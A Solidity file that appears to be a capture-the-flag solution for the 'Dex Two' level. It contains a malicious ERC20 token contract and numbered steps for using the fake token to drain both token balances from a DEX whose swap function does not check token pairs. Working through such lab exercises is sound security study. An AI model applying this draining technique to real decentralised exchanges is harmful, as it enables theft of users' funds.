//SPDX-License-Identifier: Unlicense

// Dex Two - Difficulty 4/10
// This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way.
// You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level.
// You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.
// Things that might help:
// How has the swap method been modified?
// Could you use a custom token contract in your attack?

// Solution:
// 1. Create MAL token by using Openzeppelin’s ERC20 and mint 1M of MAL to our address via _mint()
// 2. Approve the Dex contract with amount of 1000000
// 3. Add MAL token to the Dex contract via add_liquidity()
// 4. Now, we can use 100 MAL to swap 100 token2 indicating from get_swap_price().
// 5. Swap 100 MAL for 100 token2 using swap(). We successfully solve the challenge since the current balance of token2 in the Dex contract is 0.
// 6. Do the same for token1.

pragma solidity >=0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20 {
    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1000000 * (10**uint256(decimals())));
    }
}
